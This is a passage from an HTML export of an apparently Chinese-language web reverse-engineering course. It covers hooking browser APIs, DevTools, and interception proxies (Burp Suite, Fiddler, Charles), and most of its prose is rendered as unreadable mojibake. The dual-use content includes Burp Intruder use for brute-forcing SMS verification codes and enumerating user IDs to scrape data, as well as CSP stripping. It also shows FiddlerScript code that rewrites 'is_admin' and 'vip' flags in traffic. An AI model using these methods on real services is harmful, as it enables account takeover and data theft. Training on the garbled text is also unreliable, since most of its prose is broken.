    debugger; // åœ¨æ­¤å¤„æ–­ç‚¹ï¼ŒæŸ¥çœ‹è°ƒç”¨æ ˆ
    // å®é™…è®¾ç½® cookie çš„é€»è¾‘éœ€è¦å°å¿ƒå¤„ç†ï¼Œé˜²æ­¢æ— é™é€’å½’æˆ–å¤±æ•ˆ
    // é€šå¸¸åœ¨ hook ä¸­ä¸çœŸæ­£è®¾ç½®ï¼Œæˆ–è€…é€šè¿‡ document-&gt;proto-&gt;cookie setter
  },
});
</code></pre>
<h3>2. Canvas API (æŒ‡çº¹è¯†åˆ«)</h3>
<p>Canvas é™¤äº†ç»˜å›¾ï¼Œå¸¸ç”¨äº <strong>Canvas Fingerprinting</strong>ï¼ˆå¸†å¸ƒæŒ‡çº¹ï¼‰ã€‚ç½‘ç«™åœ¨ hidden canvas ä¸Šç»˜åˆ¶ç‰¹å®šæ–‡æœ¬å’Œå›¾å½¢ï¼Œè½¬æ¢æˆ base64ï¼Œä¸åŒæµè§ˆå™¨/ç¡¬ä»¶æ¸²æŸ“å‡ºçš„åƒç´ æœ‰å¾®å°å·®å¼‚ï¼Œç”Ÿæˆå”¯ä¸€ IDã€‚</p>
<ul>
<li><strong>é€†å‘ç‰¹å¾</strong>: æœç´¢ <code>toDataURL</code> æˆ– <code>getImageData</code>ã€‚</li>
<li><strong>å¯¹æŠ—</strong>: éšæœºåŒ– canvas æ¸²æŸ“ç»“æœï¼Œæˆ–å›ºå®šè¿”å›ç‰¹å®šæŒ‡çº¹ã€‚</li>
</ul>
<h3>3. Navigator API (ç¯å¢ƒæ£€æµ‹)</h3>
<p>ç”¨äºæ£€æµ‹æµè§ˆå™¨ç¯å¢ƒï¼Œåçˆ¬è™«å¸¸æ£€æŸ¥ä»¥ä¸‹å±æ€§ï¼š</p>
<ul>
<li><code>navigator.userAgent</code>: æµè§ˆå™¨ UAã€‚</li>
<li><code>navigator.webdriver</code>: <strong>é‡ç‚¹</strong>ï¼Œè‡ªåŠ¨åŒ–å·¥å…·ï¼ˆSelenium/Puppeteerï¼‰é€šå¸¸ä¸º <code>true</code>ã€‚</li>
<li><code>navigator.plugins</code>: æ’ä»¶åˆ—è¡¨ã€‚</li>
<li><code>navigator.languages</code>: è¯­è¨€ã€‚</li>
</ul>
<hr />
<h2>è·¨åŸŸé€šä¿¡ (postMessage)</h2>
<p><code>window.postMessage</code> å…è®¸ä¸åŒæºçš„çª—å£ï¼ˆå¦‚ iframe å’Œçˆ¶é¡µé¢ï¼‰é€šä¿¡ã€‚</p>
<pre><code class="language-javascript">// å‘é€æ¶ˆæ¯
otherWindow.postMessage(message, targetOrigin);

// æ¥æ”¶æ¶ˆæ¯
window.addEventListener(&quot;message&quot;, (event) =&gt; {
  if (event.origin !== &quot;http://trusted.com&quot;) return;
  console.log(event.data);
});
</code></pre>
<ul>
<li><strong>é€†å‘åœºæ™¯</strong>: å¦‚æœéªŒè¯ç æˆ–åŠ å¯†é€»è¾‘åœ¨ iframe ä¸­ï¼Œä¸»é¡µé¢é€šè¿‡ postMessage è·å– tokenï¼Œæˆ‘ä»¬éœ€è¦å…³æ³¨ message äº‹ä»¶çš„ç›‘å¬å™¨ã€‚</li>
</ul>
<hr />
<h2>æ€»ç»“</h2>
<p>æŒæ¡ Web API çš„ Hook æŠ€æœ¯æ˜¯ JS é€†å‘çš„â€œåŸºæœ¬åŠŸâ€ã€‚æ— è®ºæ˜¯ XHR/Fetch çš„ç½‘ç»œå±‚æ‹¦æˆªï¼Œè¿˜æ˜¯ Cookie/Storage çš„æ•°æ®å±‚ç›‘æ§ï¼Œäº¦æˆ–æ˜¯ Canvas/Navigator çš„ç¯å¢ƒå±‚å¯¹æŠ—ï¼Œæ ¸å¿ƒæ€è·¯éƒ½æ˜¯ï¼š<strong>æ‰¾åˆ°å…³é”® API -&gt; æ›¿æ¢å®ç° (Hook) -&gt; æ’å…¥ç›‘æ§ä»£ç /ä¿®æ”¹é€»è¾‘ -&gt; è°ƒç”¨åŸå§‹å®ç°</strong>ã€‚</p>

                                            </div>
                                            </div>
                    <div class="chapter">
                        <h1 class="no-page-break">Part III: Tools & Ingredients</h1>
                    
                                            <div class="section" id="section-15">
                                                <h2>[R14] Browser DevTools</h2>
                                                <h1>R14: æµè§ˆå™¨å¼€å‘è€…å·¥å…· (DevTools)</h1>
<h2>ğŸ’­ æ€è€ƒæ—¶åˆ»</h2>
<p>åœ¨æ·±å…¥å­¦ä¹  DevTools ä¹‹å‰ï¼Œå…ˆæ€è€ƒï¼š</p>
<ol>
<li><strong>ä½ çœŸçš„ä¼šç”¨ F12 å—ï¼Ÿ</strong> é™¤äº†çœ‹ HTML å’Œ Networkï¼Œä½ è¿˜ç”¨è¿‡å“ªäº›åŠŸèƒ½ï¼Ÿ</li>
<li><strong>æ–­ç‚¹è°ƒè¯•çš„æœ¬è´¨æ˜¯ä»€ä¹ˆï¼Ÿ</strong> ä¸ºä»€ä¹ˆè¯´&quot;ä¼šæ‰“æ–­ç‚¹çš„äººï¼Œæ‰ç®—ä¼šè°ƒè¯•&quot;ï¼Ÿ</li>
<li><strong>åŠ¨æ€ vs é™æ€ï¼š</strong> ä¸ºä»€ä¹ˆè¯´&quot;åŠ¨æ€è°ƒè¯•æ¯”é™æ€åˆ†ææ›´æœ‰æ•ˆ&quot;ï¼Ÿ</li>
<li><strong>å®æˆ˜åœºæ™¯ï¼š</strong> ä¸€ä¸ªæŒ‰é’®ç‚¹å‡»åï¼Œå‘é€äº†åŠ å¯†è¯·æ±‚ï¼Œä½ æ— æ³•ä»ä»£ç é‡Œæœåˆ°è¯·æ±‚ URLï¼ˆå› ä¸ºæ˜¯åŠ¨æ€ç”Ÿæˆçš„ï¼‰ã€‚ä½ ä¼šå¦‚ä½•å®šä½åˆ°ç”ŸæˆåŠ å¯†å‚æ•°çš„ä»£ç ï¼Ÿ</li>
</ol>
<p>æŒæ¡ DevToolsï¼Œå°±æ˜¯æŒæ¡äº†é€†å‘çš„ä¸»åŠ¨æƒã€‚</p>
<hr />
<h2>æ¦‚è¿°</h2>
<p>DevTools æ˜¯é€†å‘å·¥ç¨‹å¸ˆæœ€é¡ºæ‰‹çš„å…µå™¨ã€‚é™¤äº†åŸºç¡€çš„æŸ¥çœ‹å…ƒç´ å’Œå‘åŒ…,é€šè¿‡æŒæ¡ä¸€äº›é«˜çº§è°ƒè¯•æŠ€å·§ï¼ˆConditional Breakpoints, Local Overrides, Custom Snippetsï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥å¤§å¹…æå‡é€†å‘æ•ˆç‡ã€‚</p>
<hr />
<h2>1. Elements é¢æ¿</h2>
<p>é™¤äº†æŸ¥çœ‹ DOM ç»“æ„ï¼Œé€†å‘ä¸­å¸¸ç”¨ï¼š</p>
<h3>DOM æ–­ç‚¹ (DOM Breakpoints)</h3>
<p>å½“ä¸çŸ¥é“æ˜¯è°ä¿®æ”¹äº†æŸä¸ª DOM å…ƒç´ ï¼ˆä¾‹å¦‚ç”Ÿæˆäº†éªŒè¯ç å›¾ç‰‡ï¼Œæˆ–è€…æ’å…¥äº†åŠ å¯†çš„ Token è¾“å…¥æ¡†ï¼‰æ—¶ï¼Œä½¿ç”¨å®ƒã€‚</p>
<ul>
<li><strong>Subtree modifications</strong>: ç›‘å¬å­èŠ‚ç‚¹å˜åŒ–ã€‚</li>
<li><strong>Attribute modifications</strong>: ç›‘å¬å±æ€§å˜åŒ–ï¼ˆå¦‚ <code>class</code>, <code>src</code>, <code>value</code>ï¼‰ã€‚</li>
<li><strong>Node removal</strong>: ç›‘å¬èŠ‚ç‚¹è¢«åˆ é™¤ã€‚</li>
</ul>
<blockquote>
<p><strong>æŠ€å·§</strong>: æ–­ä¸‹åï¼ŒæŸ¥çœ‹ Call Stack (è°ƒç”¨æ ˆ)ï¼Œé€šå¸¸èƒ½ç›´æ¥å®šä½åˆ°æ“ä½œ DOM çš„ JS ä»£ç ã€‚</p>
</blockquote>
<hr />
<h2>2. Console é¢æ¿</h2>
<p>ä¸ä»…ä»…æ˜¯æ‰“å°æ—¥å¿—ã€‚</p>
<h3>å®ç”¨æŒ‡ä»¤ (Console API)</h3>
<ul>
<li><code>debug(fn)</code>: å½“æŒ‡å®šå‡½æ•° <code>fn</code> è¢«è°ƒç”¨æ—¶ï¼Œè‡ªåŠ¨æ–­ç‚¹ã€‚</li>
<li><code>monitor(fn)</code>: å½“ <code>fn</code> è¢«è°ƒç”¨æ—¶ï¼Œè‡ªåŠ¨ Log è¾“å‡ºå‚æ•°ã€‚</li>
<li><code>queryObjects(Constructor)</code>: <strong>å¼ºåŠ›å·¥å…·</strong>ã€‚æŸ¥æ‰¾æ‰€æœ‰è¯¥æ„é€ å‡½æ•°çš„å®ä¾‹ã€‚<ul>
<li>ä¾‹å¦‚ï¼š<code>queryObjects(WebSocket)</code> å¯ä»¥åˆ—å‡ºå½“å‰é¡µé¢æ‰€æœ‰çš„ WebSocket è¿æ¥å¯¹è±¡ã€‚</li>
</ul>
</li>
<li><code>getEventListeners(node)</code>: è·å– DOM èŠ‚ç‚¹ç»‘å®šçš„æ‰€æœ‰äº‹ä»¶ç›‘å¬å™¨ã€‚</li>
</ul>
<h3>å½“å‰ä¸Šä¸‹æ–‡ (Context)</h3>
<p>Console å·¦ä¸Šè§’å¯ä»¥é€‰æ‹© Execution Contextã€‚å¦‚æœç½‘é¡µä½¿ç”¨äº† iframe æˆ–è€… Web Workerï¼Œè®°å¾—åˆ‡æ¢ä¸Šä¸‹æ–‡ï¼Œå¦åˆ™è®¿é—®ä¸åˆ°é‡Œé¢çš„å˜é‡ã€‚</p>
<hr />
<h2>3. Sources é¢æ¿</h2>
<p>è°ƒè¯•çš„æ ¸å¿ƒæˆ˜åœºã€‚</p>
<h3>XHR/Fetch Breakpoints</h3>
<p>åœ¨å³ä¾§é¢æ¿å‹¾é€‰ &quot;XHR/fetch breakpoints&quot;ï¼Œè¾“å…¥ URL å…³é”®è¯ï¼ˆå¦‚ <code>/login</code>, <code>sign</code>ï¼‰ã€‚</p>
<ul>
<li>å½“å‘ç”ŸåŒ…å«è¯¥å…³é”®è¯çš„ç½‘ç»œè¯·æ±‚æ—¶ï¼Œä¼šåœ¨ <code>send()</code> æˆ– <code>fetch()</code> è°ƒç”¨å¤„æ–­ä¸‹ã€‚</li>
</ul>
<h3>Event Listener Breakpoints</h3>
<p>ä¸æƒ³æ‰‹åŠ¨æ‰¾ DOM ç»‘å®šäº‹ä»¶ï¼Ÿç›´æ¥å‹¾é€‰ <code>Mouse -&gt; click</code> æˆ– <code>Keyboard -&gt; keydown</code>ã€‚</p>
<h3>Snippets (ä»£ç ç‰‡æ®µ)</h3>
<p>åœ¨ &quot;Snippets&quot; æ ‡ç­¾é¡µå¯ä»¥ä¿å­˜å¸¸ç”¨çš„ Hook è„šæœ¬ã€‚</p>
<ul>
<li><strong>ä¼˜ç‚¹</strong>: è·¨é¡µé¢é€šç”¨ï¼Œé€šè¿‡ <code>Ctrl+Enter</code> å¿«é€Ÿæ‰§è¡Œã€‚</li>
<li><strong>åœºæ™¯</strong>: æ³¨å…¥é€šç”¨çš„ Cookie Hook, Debugger Bypass è„šæœ¬ã€‚</li>
</ul>
<h3>Local Overrides (æœ¬åœ°æ›¿æ¢)</h3>
<p><strong>é€†å‘ç¥å™¨</strong>ã€‚å…è®¸ä½ ä¿®æ”¹çº¿ä¸Šçš„ JS æ–‡ä»¶å¹¶åœ¨æœ¬åœ°ä¿å­˜ï¼Œåˆ·æ–°é¡µé¢åä¾ç„¶ç”Ÿæ•ˆã€‚</p>
<ol>
<li>é™¤äº† &quot;Overrides&quot; æ ‡ç­¾é¡µï¼Œé€‰æ‹©ä¸€ä¸ªæœ¬åœ°æ–‡ä»¶å¤¹ã€‚</li>
<li>åœ¨ &quot;Network&quot; æˆ– &quot;Sources&quot; é¢æ¿æ‰¾åˆ° JS æ–‡ä»¶ï¼Œå³é”® -&gt; &quot;Save for overrides&quot;ã€‚</li>
<li>ç›´æ¥ç¼–è¾‘ä»£ç ï¼ŒCtrl+S ä¿å­˜ã€‚</li>
<li><strong>ç”¨é€”</strong>: åˆ é™¤æ··æ·†ä»£ç ä¸­çš„åè°ƒè¯•é€»è¾‘ã€æ³¨å…¥ Log ä»£ç ã€ä¿®æ”¹åŠ å¯†å‡½æ•°çš„è¿”å›å€¼ã€‚</li>
</ol>
<hr />
<h2>4. Network é¢æ¿</h2>
<h3>Initiator (å‘èµ·è€…)</h3>
<p>åœ¨è¯·æ±‚åˆ—è¡¨ä¸­ï¼Œé¼ æ ‡æ‚¬åœåœ¨ &quot;Initiator&quot; åˆ—ã€‚</p>
<ul>
<li>å®ƒä¼šæ˜¾ç¤ºè¿™å°±è¯·æ±‚çš„è°ƒç”¨æ ˆé“¾ã€‚ç‚¹å‡»è“è‰²çš„æ–‡ä»¶åï¼Œç›´æ¥è·³è½¬åˆ°å‘åŒ…çš„ JS ä»£ç ã€‚</li>
</ul>
<h3>Replay XHR (é‡æ”¾)</h3>
<p>å³é”®è¯·æ±‚ -&gt; &quot;Replay XHR&quot;ã€‚å¿«é€Ÿé‡å‘è¯·æ±‚ï¼Œç”¨äºæµ‹è¯•ç­¾åçš„æ—¶æ•ˆæ€§ã€‚</p>
<h3>Block Request URL (å±è”½è¯·æ±‚)</h3>
<p>å³é”®è¯·æ±‚ -&gt; &quot;Block Request URL&quot;ã€‚</p>
<ul>
<li><strong>ç”¨é€”</strong>: å±è”½æŸäº›ç¬¬ä¸‰æ–¹çš„ç›‘æ§è„šæœ¬ã€å¹¿å‘Šè„šæœ¬ï¼Œæˆ–è€…å±è”½åŠ è½½ Wasm æ–‡ä»¶ä»¥å¼ºåˆ¶é™çº§åˆ° JS ç‰ˆæœ¬ï¼ˆå¦‚æœç½‘ç«™æœ‰é™çº§é€»è¾‘ï¼‰ã€‚</li>
</ul>
<hr />
<h2>5. Application é¢æ¿</h2>
<h3>Storage</h3>
<p>ç›´æ¥æŸ¥çœ‹å’Œä¿®æ”¹ LocalStorage, SessionStorage, Cookies, IndexedDBã€‚</p>
<h3>Service Workers</h3>
<p>æœ‰äº›ç½‘ç«™ä½¿ç”¨ SW æ¥æ‹¦æˆªè¯·æ±‚æˆ–åšç¼“å­˜ã€‚å¦‚æœè°ƒè¯•æ—¶å‘ç° Network é¢æ¿è¡Œä¸ºæ€ªå¼‚ï¼ˆå¦‚è¯·æ±‚ç›´æ¥ä» ServiceWorker è¿”å›ï¼‰ï¼Œå¯ä»¥åœ¨ &quot;Service Workers&quot; æ ‡ç­¾é¡µå‹¾é€‰ &quot;Bypass for network&quot; æˆ–ç›´æ¥ &quot;Unregister&quot;ã€‚</p>
<hr />
<h2>æ€»ç»“</h2>
<p>ç†Ÿç»ƒä½¿ç”¨ DevTools çš„é«˜çº§åŠŸèƒ½ï¼Œå¯ä»¥è®©ä½ åœ¨æ²¡æœ‰æºç çš„æƒ…å†µä¸‹ï¼Œå¿«é€Ÿåˆ‡å…¥ä¸šåŠ¡é€»è¾‘çš„æ ¸å¿ƒã€‚</p>
<ul>
<li>æ‰¾ä¸åˆ°å…¥å£ï¼Ÿç”¨ <strong>Event Listener / XHR Breakpoints</strong>ã€‚</li>
<li>æ‰¾åˆ°äº†æ··æ·†ä»£ç æƒ³æ”¹ï¼Ÿç”¨ <strong>Local Overrides</strong>ã€‚</li>
<li>æƒ³æ‰¾éšè—çš„å¯¹è±¡ï¼Ÿç”¨ <strong>Console <code>queryObjects</code></strong>ã€‚</li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-16">
                                                <h2>[R15] Burp Suite Guide</h2>
                                                <h1>R15: Burp Suite æŒ‡å—</h1>
<h2>æ¦‚è¿°</h2>
<p>Burp Suite ä¸ä»…ä»…æ˜¯æ¸—é€æµ‹è¯•ç¥å™¨ï¼Œä¹Ÿæ˜¯ Web é€†å‘ä¸­æœ€å¼·å¤§çš„ä¸­é—´äººæ”»å‡»ï¼ˆMITMï¼‰å·¥å…·ã€‚å®ƒä¸ä»…èƒ½æŠ“åŒ…ï¼Œè¿˜èƒ½ä¿®æ”¹é‡å‘ã€æš´åŠ›ç ´è§£ç­¾åã€è‡ªåŠ¨åŒ–è§£ç ç­‰ã€‚æœ¬æŒ‡å—ä»…å…³æ³¨é€†å‘å·¥ç¨‹ä¸­å¸¸ç”¨çš„åŠŸèƒ½ã€‚</p>
<hr />
<h2>1. åŸºç¡€é…ç½® (Proxy &amp; Cert)</h2>
<h3>æ‹¦æˆª HTTPS æµé‡</h3>
<ol>
<li><strong>é…ç½®ä»£ç†</strong>: æµè§ˆå™¨è®¾ç½®ä»£ç†ä¸º <code>127.0.0.1:8080</code> (Burp é»˜è®¤ç«¯å£)ã€‚</li>
<li><strong>å®‰è£…è¯ä¹¦</strong>: è®¿é—® <code>http://burp</code>ï¼Œä¸‹è½½ CA è¯ä¹¦ã€‚<ul>
<li><strong>Windows/Mac</strong>: åŒå‡»å®‰è£…ï¼ŒåŠ¡å¿…é€‰æ‹©â€œå—ä¿¡ä»»çš„æ ¹è¯ä¹¦é¢å‘æœºæ„â€ã€‚</li>
<li><strong>Android/iOS</strong>: å®‰è£…è¯ä¹¦åï¼Œéœ€åœ¨ç³»ç»Ÿè®¾ç½®ä¸­â€œé’ˆå¯¹æ ¹è¯ä¹¦å¯ç”¨å®Œå…¨ä¿¡ä»»â€ã€‚</li>
</ul>
</li>
</ol>
<h3>Invisible Proxy (éšå½¢ä»£ç†)</h3>
<p>å½“å®¢æˆ·ç«¯ï¼ˆå¦‚æŸäº›éæµè§ˆå™¨å‘åŒ…çš„ EXE æˆ– Python è„šæœ¬ï¼‰ä¸æ”¯æŒé…ç½®ä»£ç†ï¼Œæˆ–è€…å¼ºåˆ¶æ ¡éªŒ Host å¤´æ—¶ï¼š</p>
<ol>
<li>ä¿®æ”¹ Hosts æ–‡ä»¶ï¼Œå°† <code>target.com</code> æŒ‡å‘ <code>127.0.0.1</code>ã€‚</li>
<li>Burp -&gt; Proxy -&gt; Options -&gt; Edit Interface <code>127.0.0.1:443</code> -&gt; Request handling -&gt; Support invisible proxying (True).</li>
<li>è¿™æ ·æ‰€æœ‰å‘å¾€æœ¬åœ° 443 çš„æµé‡éƒ½ä¼šè¢« Burp æ‹¦æˆªå¹¶è½¬å‘ã€‚</li>
</ol>
<hr />
<h2>2. Repeater (é‡æ”¾å™¨)</h2>
<p>è¿™æ˜¯é€†å‘ä¸­æœ€å¸¸ç”¨çš„æ¨¡å—ã€‚</p>
<ul>
<li><strong>åŸºæœ¬ç”¨æ³•</strong>: åœ¨ Proxy History ä¸­å³é”®è¯·æ±‚ -&gt; &quot;Send to Repeater&quot; (Ctrl+R)ã€‚</li>
<li><strong>ç”¨é€”</strong>:<ul>
<li>ä¿®æ”¹å‚æ•°ï¼ˆå¦‚ <code>id=1</code> æ”¹ <code>id=2</code>ï¼‰æµ‹è¯•è¶Šæƒã€‚</li>
<li>åˆ é™¤ç‰¹å®šçš„ Headerï¼ˆå¦‚ <code>Signature</code>ï¼‰æµ‹è¯•æ˜¯å¦å¿…é¡»ã€‚</li>
<li>æµ‹è¯• Token çš„æœ‰æ•ˆæœŸã€‚</li>
</ul>
</li>
</ul>
<hr />
<h2>3. Intruder (å…¥ä¾µè€…)</h2>
<p>ç”¨äºè‡ªåŠ¨åŒ–çˆ†ç ´ã€‚</p>
<ul>
<li><strong>åœºæ™¯</strong>:<ul>
<li>çˆ†ç ´çŸ­ä¿¡éªŒè¯ç  (4 ä½/6 ä½)ã€‚</li>
<li>éå†ç”¨æˆ· ID çˆ¬å–æ•°æ®ã€‚</li>
<li>å¦‚æœç­¾åç®—æ³•å·²çŸ¥ï¼Œå¯ä»¥å†™æ’ä»¶ï¼ˆExtenderï¼‰è‡ªåŠ¨è®¡ç®—ç­¾åè¿›è¡Œæ‰¹é‡è¯·æ±‚ã€‚</li>
</ul>
</li>
</ul>
<hr />
<h2>4. Decoder (è§£ç å™¨)</h2>
<p>å†…ç½®çš„ç¼–ç è½¬æ¢å·¥å…·ã€‚</p>
<ul>
<li>æ”¯æŒ URL, Base64, Hex, Gzip ç­‰å¸¸è§æ ¼å¼ã€‚</li>
<li><strong>Smart Decode</strong>: æ™ºèƒ½å°è¯•è§£ç ï¼Œå¯¹ä»˜å¤šå±‚ç¼–ç ï¼ˆå¦‚ Base64 é‡Œé¢åŒ… URL ç¼–ç ï¼‰å¾ˆæœ‰æ•ˆã€‚</li>
</ul>
<hr />
<h2>5. Match and Replace (è‡ªåŠ¨æ›¿æ¢)</h2>
<p>åœ¨ Proxy -&gt; Options -&gt; Match and Replace ä¸­è®¾ç½®è§„åˆ™ã€‚</p>
<ul>
<li><strong>é€†å‘åœºæ™¯</strong>:<ul>
<li><strong>Bypass CSP</strong>: è‡ªåŠ¨åˆ é™¤å“åº”å¤´ä¸­çš„ <code>Content-Security-Policy</code>ï¼Œå…è®¸æˆ‘ä»¬åœ¨é¡µé¢æ‰§è¡Œä»»æ„ JSã€‚</li>
<li><strong>ä¿®æ”¹è¿”å›åŒ…</strong>: å°† <code>{&quot;is_vip&quot;: false}</code> è‡ªåŠ¨æ›¿æ¢ä¸º <code>{&quot;is_vip&quot;: true}</code>ã€‚</li>
<li><strong>æ³¨å…¥è„šæœ¬</strong>: åœ¨ <code>&lt;body&gt;</code> æ ‡ç­¾åè‡ªåŠ¨æ’å…¥ <code>&lt;script src=&quot;http://127.0.0.1/hook.js&quot;&gt;&lt;/script&gt;</code>ã€‚</li>
</ul>
</li>
</ul>
<hr />
<h2>6.å¸¸ç”¨æ’ä»¶ (Extensions)</h2>
<p>ä» BApp Store å®‰è£…ï¼š</p>
<ol>
<li><strong>Logger++</strong>: æ›´å¼ºå¤§çš„æ—¥å¿—æŸ¥çœ‹å™¨ï¼Œæ”¯æŒæœç´¢ã€‚</li>
<li><strong>Turbo Intruder</strong>: åŸºäº Python çš„è¶…é«˜æ€§èƒ½å‘åŒ…å™¨ã€‚</li>
<li><strong>HackBar</strong>: ç±»æµè§ˆå™¨æ’ä»¶çš„è¾…åŠ©å·¥å…·ã€‚</li>
</ol>
<hr />
<h2>æ€»ç»“</h2>
<p>åœ¨ Web é€†å‘ä¸­ï¼Œæˆ‘ä»¬é€šå¸¸å°† Burp Suite é…åˆæµè§ˆå™¨ DevTools ä½¿ç”¨ï¼š</p>
<ul>
<li><strong>DevTools</strong> è´Ÿè´£åˆ†æ JS é€»è¾‘ï¼Œç”Ÿæˆç­¾åã€‚</li>
<li><strong>Burp Suite</strong> è´Ÿè´£æ‹¦æˆªè¯·æ±‚ï¼ŒéªŒè¯ç­¾åï¼Œé‡æ”¾æ”»å‡»ã€‚</li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-17">
                                                <h2>[R16] Fiddler Guide</h2>
                                                <h1>R16: Fiddler Classic æŒ‡å—</h1>
<h2>æ¦‚è¿°</h2>
<p>Fiddler (Classic) æ˜¯ä¸€æ¬¾å†å²æ‚ ä¹…ã€åŠŸèƒ½å¼ºå¤§çš„æŠ“åŒ…å·¥å…·ã€‚è™½ç„¶ç•Œé¢ç¨æ˜¾å¤å¤ï¼Œä½†å…¶æ ¸å¿ƒä¼˜åŠ¿åœ¨äº<strong>FiddlerScript</strong>â€”â€”å…è®¸ä½ ç”¨ C# ä»£ç æå…¶çµæ´»åœ°æ§åˆ¶ HTTP è¯·æ±‚çš„æ¯ä¸€ä¸ªç»†èŠ‚ã€‚</p>
<hr />
<h2>1. åŸºç¡€é…ç½®</h2>
<h3>Tools -&gt; Options -&gt; HTTPS</h3>
<ul>
<li>å‹¾é€‰ &quot;Decrypt HTTPS traffic&quot;ã€‚</li>
<li>ç‚¹å‡» &quot;Actions&quot; -&gt; &quot;Trust Root Certificate&quot;ã€‚</li>
</ul>
<h3>Tools -&gt; Options -&gt; Connections</h3>
<ul>
<li>Fiddler listens on port: 8888 (é»˜è®¤)ã€‚</li>
<li>å‹¾é€‰ &quot;Allow remote computers to connect&quot; (å¦‚æœè¦æŠ“æ‰‹æœºåŒ…)ã€‚</li>
</ul>
<hr />
<h2>2. æ ¸å¿ƒåŠŸèƒ½</h2>
<h3>Composer (æ„é€ å™¨)</h3>
<ul>
<li><strong>åŠŸèƒ½</strong>: æ‰‹åŠ¨æ„é€  HTTP è¯·æ±‚ã€‚</li>
<li><strong>ç”¨é€”</strong>: ç±»ä¼¼ Burp Repeaterï¼Œä½†æ›´åå‘äºä»é›¶æ„é€ è¯·æ±‚ã€‚å¯ä»¥ç›´æ¥æ‹–æ‹½å·¦ä¾§çš„ Session åˆ° Composer tab æ¥å¿«é€Ÿå¡«å……ã€‚</li>
</ul>
<h3>AutoResponder (è‡ªåŠ¨å“åº”å™¨)</h3>
<ul>
<li><strong>åŠŸèƒ½</strong>: è‡ªåŠ¨åŒ¹é…è§„åˆ™å¹¶è¿”å›é¢„è®¾å†…å®¹ã€‚</li>
<li><strong>ç”¨é€”</strong>: æ›¿æ¢çº¿ä¸Šæ–‡ä»¶ï¼ˆç±»ä¼¼ Charles Map Localï¼‰ã€‚<ul>
<li>Rule: <code>REGEX:(?insx).*\/script\.js</code></li>
<li>Action: <code>C:\Users\Admin\Desktop\hook.js</code></li>
</ul>
</li>
</ul>
<hr />
<h2>3. FiddlerScript (ç»ˆææ€å™¨)</h2>
<p>ç‚¹å‡» Fiddler ä¸‹æ–¹çš„ &quot;FiddlerScript&quot; æ ‡ç­¾é¡µã€‚è¿™æ˜¯åŸºäº JScript.NET çš„è„šæœ¬ç¯å¢ƒã€‚</p>
<h3>å¸¸ç”¨ Hook ç‚¹</h3>
<h4>OnBeforeRequest (è¯·æ±‚å‰)</h4>
<pre><code class="language-csharp">static function OnBeforeRequest(oSession: Session) {
    // æ‹¦æˆªç‰¹å®š URL
    if (oSession.uriContains(&quot;/api/v1/sign&quot;)) {
        // ä¿®æ”¹è¯·æ±‚ä½“
        var sBody = oSession.GetRequestBodyAsString();
        sBody = sBody.Replace(&quot;vip=false&quot;, &quot;vip=true&quot;);
        oSession.utilSetRequestBody(sBody);

        // æ‰“å° Log åˆ° Fiddler Log é¢æ¿
        FiddlerObject.log(&quot;Tampered body: &quot; + sBody);
    }
}
</code></pre>
<h4>OnBeforeResponse (å“åº”å‰)</h4>
<pre><code class="language-csharp">static function OnBeforeResponse(oSession: Session) {
    if (oSession.HostnameIs(&quot;api.target.com&quot;)) {
        oSession.utilDecodeResponse(); // è§£ç  gzip
        var sBody = oSession.GetResponseBodyAsString();

        // æ›¿æ¢ JSON å†…å®¹
        if (sBody.Contains(&quot;\&quot;is_admin\&quot;:false&quot;)) {
            sBody = sBody.Replace(&quot;\&quot;is_admin\&quot;:false&quot;, &quot;\&quot;is_admin\&quot;:true&quot;);
            oSession.utilSetResponseBody(sBody);
            oSession.oResponse.headers.Remove(&quot;Content-Security-Policy&quot;); // ç§»é™¤ CSP
        }
    }
}
</code></pre>
<h3>ä¸ºä»€ä¹ˆç”¨ FiddlerScriptï¼Ÿ</h3>
<ul>
<li>æ¯”ç®€å•çš„æ­£åˆ™æ›¿æ¢æ›´çµæ´»ï¼ˆæ”¯æŒ if-else é€»è¾‘ï¼‰ã€‚</li>
<li>å¯ä»¥è°ƒç”¨ .NET åº“è¿›è¡Œå¤æ‚çš„åŠ è§£å¯†æ“ä½œã€‚</li>
</ul>
<hr />
<h2>4. ç§»åŠ¨ç«¯æŠ“åŒ…</h2>
<ol>
<li><strong>PC é…ç½®</strong>: å¼€å¯ &quot;Allow remote computers to connect&quot;ï¼Œé‡å¯ Fiddlerã€‚</li>
<li><strong>æ‰‹æœºé…ç½®</strong>: è®¾ç½®ä»£ç†ä¸º PC IP + 8888ã€‚</li>
<li><strong>å®‰è£…è¯ä¹¦</strong>: æ‰‹æœºæµè§ˆå™¨è®¿é—® <code>http://ipv4:8888</code>ï¼Œç‚¹å‡»é“¾æ¥ä¸‹è½½è¯ä¹¦ã€‚</li>
<li><strong>æ³¨æ„</strong>: å³ä½¿åœ¨ PC ç«¯ï¼Œä¹Ÿå¯ä»¥ç”¨ &quot;FiddlerScript&quot; æ§åˆ¶æ‰‹æœºçš„æµé‡ã€‚</li>
</ol>
<hr />
<h2>æ€»ç»“</h2>
<p>å¦‚æœä½ éœ€è¦æå…¶å¤æ‚çš„ä¸­é—´äººé€»è¾‘ï¼ˆæ¯”å¦‚ï¼šè¯·æ±‚ A è¿”å› -&gt; è§£æå‡º Token -&gt; è‡ªåŠ¨å‘è¯·æ±‚ Bï¼‰ï¼ŒFiddlerScript æ˜¯æœ€ä½³é€‰æ‹©ã€‚</p>

                                            </div>
                                            
                                            <div class="section" id="section-18">
                                                <h2>[R17] Charles Guide</h2>
                                                <h1>R17: Charles Proxy æŒ‡å—</h1>
<h2>æ¦‚è¿°</h2>
<p>Charles æ˜¯ Mac/Windows ä¸Šæœ€æµè¡Œçš„æŠ“åŒ…å·¥å…·ä¹‹ä¸€ï¼Œä»¥å…¶ç•Œé¢ç®€æ´ã€åŠŸèƒ½å®ç”¨è‘—ç§°ã€‚åœ¨ç§»åŠ¨ç«¯ï¼ˆAndroid/iOSï¼‰é€†å‘ä¸­ï¼ŒCharles å¾€å¾€æ˜¯é¦–é€‰çš„æŠ“åŒ…å·¥å…·ã€‚</p>
<hr />
<h2>1. åŸºç¡€é…ç½®</h2>
<h3>æŠ“å– HTTPS</h3>
<ol>
<li><strong>PC ç«¯å®‰è£…è¯ä¹¦</strong>: <code>Help -&gt; SSL Proxying -&gt; Install Charles Root Certificate</code>ã€‚</li>
<li><strong>ç§»åŠ¨ç«¯å®‰è£…è¯ä¹¦</strong>:<ul>
<li><code>Help -&gt; SSL Proxying -&gt; Install Charles Root Certificate on a Mobile Device or Remote Browser</code>ã€‚</li>
